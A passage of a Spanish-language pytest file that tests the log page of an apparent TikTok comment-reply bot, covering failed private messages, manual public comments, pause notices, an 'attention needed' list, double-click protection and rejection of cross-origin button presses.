    with conn:
        conn.execute("UPDATE envios SET estado = 'dudoso' WHERE user_id = 'u:linda'")
    texto = cliente.get("/registro").text
    assert "TikTok tampoco dejó pasar" in texto and "Intentar otra vez" in texto and "location.reload" not in texto
    with conn:
        conn.execute("UPDATE envios SET estado = 'enviado' WHERE user_id = 'u:linda'")
        conn.execute("UPDATE contactos SET resultado = 'dm_enviado' WHERE usuario = 'linda'")
    texto = cliente.get("/registro").text
    assert "Mensaje privado enviado a mano." in texto and 'action="/registro/privado/u:linda"' not in texto


def test_pulsar_el_boton_con_el_bot_en_pausa_avisa_de_que_saldra_al_reanudar(cliente, conn):
    from bot import config as cfg
    _no_le_llego(conn)
    cfg.guardar(conn, "orden_pausa", True)
    texto = cliente.post("/registro/privado/u:linda").text
    assert "saldrá cuando pulses «Reanudar»" in texto


def test_el_boton_no_sirve_desde_otra_web(cliente, conn):
    _no_le_llego(conn)
    r = cliente.post("/registro/privado/u:linda", headers={"Origin": "https://otra-web.com"}, follow_redirects=False)
    assert r.status_code == 403
    assert conn.execute("SELECT COUNT(*) FROM envios").fetchone()[0] == 0


# ------------------------------------------------------------------ 27 nov: comentar a mano y «Necesitan atención»


def test_registro_ofrece_comentar_en_publico_a_quien_no_le_llego_el_privado(cliente, conn):
    _no_le_llego(conn)
    texto = cliente.get("/registro").text
    assert 'action="/registro/publica/c9"' in texto and "Comentar en público ahora" in texto


def test_comentar_a_mano_se_pide_una_sola_vez_y_el_registro_dice_como_va(cliente, conn):
    _no_le_llego(conn)
    r = cliente.post("/registro/publica/c9", follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"].startswith("/registro")
    cliente.post("/registro/publica/c9", follow_redirects=False)  # doble clic: un solo comentario
    filas = conn.execute("SELECT * FROM envios WHERE tipo = 'publica_manual'").fetchall()
    assert len(filas) == 1 and filas[0]["comentario_id"] == "c9" and filas[0]["estado"] == "pendiente"
    texto = cliente.get("/registro").text
    assert "Publicando el comentario…" in texto and 'action="/registro/publica/c9"' not in texto
    with conn:
        conn.execute("UPDATE envios SET estado = 'enviado' WHERE tipo = 'publica_manual'")
    assert "Comentario publicado a mano." in cliente.get("/registro").text


def test_a_un_comentario_ofensivo_no_se_le_ofrece_comentar_en_publico(cliente, conn):
    _no_le_llego(conn)
    with conn:
        conn.execute("UPDATE comentarios SET ofensivo = 1 WHERE id = 'c9'")
    assert 'action="/registro/publica/c9"' not in cliente.get("/registro").text
    cliente.post("/registro/publica/c9", follow_redirects=False)
    assert conn.execute("SELECT COUNT(*) FROM envios WHERE tipo = 'publica_manual'").fetchone()[0] == 0


def test_necesitan_atencion_reune_a_quien_el_bot_no_pudo_escribir(cliente, conn):
    """Pedido del usuario (27 nov): un apartado para ver de un vistazo a quién no le llegó el privado y actuar."""
    _no_le_llego(conn)  # linda: TikTok no dejó pasar el privado
    meter_comentario(conn, "c10", "cerrada", estado="completado_cerrado")
    meter_comentario(conn, "c11", "bien", estado="completado")
    with conn:
        conn.execute("UPDATE contactos SET contactado = 1, resultado = 'dm_cerrado' WHERE usuario = 'cerrada'")
        conn.execute("UPDATE contactos SET contactado = 1, resultado = 'dm_enviado' WHERE usuario = 'bien'")
    texto = cliente.get("/registro?estado=atender").text
    assert "Necesitan atención" in texto
    assert "@linda" in texto and "@cerrada" in texto and "@bien" not in texto
    assert "@luis" in texto  # error_final: el bot no pudo terminar
    inicio = cliente.get("/").text
    assert 'href="/registro?estado=atender"' in inicio


def test_necesitan_atencion_muestra_a_cada_persona_una_sola_vez_con_su_ultimo_comentario(cliente, conn):
    """Con datos reales (27 nov) @persona.dos salía 6 veces: para actuar rápido, un renglón por persona."""
    meter_comentario(conn, "viejo", "linda", texto="comentario viejo", estado="completado_cerrado", hace_min=300)
    meter_comentario(conn, "nuevo", "linda", texto="comentario nuevo", estado="saltado_contactado", hace_min=5)
    with conn:
        conn.execute("UPDATE contactos SET contactado = 1, resultado = 'dm_no_entregado' WHERE usuario = 'linda'")
    texto = cliente.get("/registro?estado=atender").text
    assert texto.count("@linda") == 1
    assert "comentario nuevo" in texto and "comentario viejo" not in texto
    assert 'action="/registro/publica/nuevo"' in texto
    assert "@linda" in cliente.get("/registro").text  # el Registro completo sigue con todos los comentarios
    assert cliente.get("/registro").text.count("comentario viejo") == 1
